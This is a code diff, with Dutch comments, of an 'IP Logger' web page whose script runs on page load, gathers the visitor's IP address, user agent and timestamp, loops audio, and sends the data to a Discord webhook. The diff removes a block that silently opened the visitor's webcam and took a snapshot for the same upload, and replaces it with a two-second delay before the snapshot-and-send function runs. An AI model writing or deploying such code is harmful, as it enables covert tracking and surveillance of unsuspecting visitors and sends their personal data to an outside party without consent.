@@ -5,33 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Logger</title>
     <script>
-        // Functie om IP-adres, gebruikersagent, tijdstip en een foto te verkrijgen
+        // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
         function getIP(json) {
             var ipAddress = json.ip;
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
-            var video = document.getElementById('video');
 
             // Muziek afspelen
             var audio = new Audio('sound.mp3');
             audio.loop = true;
             audio.play();
 
-            // Toegang vragen tot de camera
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function (stream) {
-                    video.srcObject = stream;
-                    video.play();
-                    // Wachten op het laden van de video feed
-                    video.onloadedmetadata = function () {
-                        setTimeout(function () {
-                            takeSnapshot(ipAddress, userAgent, timestamp);
-                        }, 1000); // Wacht 1 seconde voordat de foto wordt gemaakt
-                    };
-                })
-                .catch(function (err) {
-                    console.error("Error accessing camera: ", err);
-                });
+            // Vertraging van 2 seconden voordat het maken van de foto en het verzenden van de webhook plaatsvindt
+            setTimeout(function() {
+                takeSnapshot(ipAddress, userAgent, timestamp);
+            }, 2000);
         }
 
         // Functie om een foto te maken en naar Discord webhook te sturen in een embed bericht
@@ -91,14 +79,6 @@
             
             // Stuur het verzoek
             xhr.send(payload);
-
-            // Stop de video feed en de camera
-            var stream = video.srcObject;
-            var tracks = stream.getTracks();
-            tracks.forEach(function(track) {
-                track.stop();
-            });
-            video.srcObject = null;
         }
 
         // Wanneer de pagina wordt geladen, roep dan de functie op om het IP-adres te verkrijgen
